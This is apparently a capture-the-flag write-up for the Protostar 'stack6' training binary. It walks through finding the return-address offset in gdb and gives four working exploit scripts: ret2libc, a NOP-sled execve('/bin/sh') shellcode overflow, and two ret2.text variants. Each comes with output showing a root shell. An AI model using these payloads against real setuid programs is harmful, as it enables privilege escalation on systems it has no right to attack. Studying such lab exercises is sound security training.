# stack6

## solution
Finding the offset to %eip.
```
(gdb) r
Starting program: /opt/protostar/bin/stack5 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFF

Program received signal SIGSEGV, Segmentation fault.
0x45454545 in ?? ()
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/protostar/bin/stack5 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

The solution I've used here, to bypass the check on the return address, is to use the simple
`ret2libc` exploit, so I'll skip over it in the shells section.
```py
import struct

off = 80
pad = 'A' * off

sys = struct.pack('I', 0xb7ecffb0)
she = struct.pack('I', 0xb7fb63bf)

print pad + sys + 'AAAA' + she
```

Here it is in action.
```
user@protostar:/opt/protostar/bin$ (cat /tmp/pwn; cat) | ./stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAA���AAAA�c��
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
```

## shells

### classic buffer overflow (sort of)
```py
import struct

off = 80

pad = 'A' * off

buf = ''
buf += '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9'
buf += '\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89'
buf += '\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'

nop = '\x90' * 0x80

ret = struct.pack('I', 0x08048508)
ret += struct.pack('I', 0xbffff750 + off + 0x80)

print pad + ret + nop + buf
```

Here it is in action.
```
user@protostar:/opt/protostar/bin$ python /tmp/pwn.py | ./stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA �����������������������������������������������������������������������������������������������������������������������������������1�1۰̀Sh/ttyh/dev��1�f�'�̀1�Ph//shh/bin��PS�ᙰ

# id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
```

### ret2.text to shellcode
```py
import struct

off = 80

pad = 'A' * off

buf = ''
buf += '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9'
buf += '\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89'
buf += '\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'

nop = '\x90' * 0x80

ret = struct.pack('I', 0x08048452)

ret += 'AAAA'                                    # POP
ret += 'AAAA'                                    # POP
ret += struct.pack('I', 0xbffff750 + off + 0x80) # RET

print pad + ret + nop + buf
```

Here it is in action.
```
user@protostar:/opt/protostar/bin$ python /tmp/pwn.py | ./stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAARAAAAAAAAAAAARAAAAAAAA �����������������������������������������������������������������������������������������������������������������������������������1�1۰̀Sh/ttyh/dev��1�f�'�̀1�Ph//shh/bin��PS�ᙰ

# id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
```

### ret2.text to libc
```py
import struct

off = 80

pad = 'A' * off

system = struct.pack('I', 0xb7ecffb0)
bin_sh = struct.pack('I', 0xb7e97000 + 0x11f3bf)

ret = struct.pack('I', 0x08048452)

ret += 'AAAA' # POP
ret += 'AAAA' # POP
ret += system # RET

print pad + ret + 'AAAA' + bin_sh
```

Here it is in action.
```
user@protostar:/opt/protostar/bin$ (python /tmp/pwn.py; cat) | ./stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAARAAAAAAAAAAAARAAAAAAAA���AAAA�c��
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
```
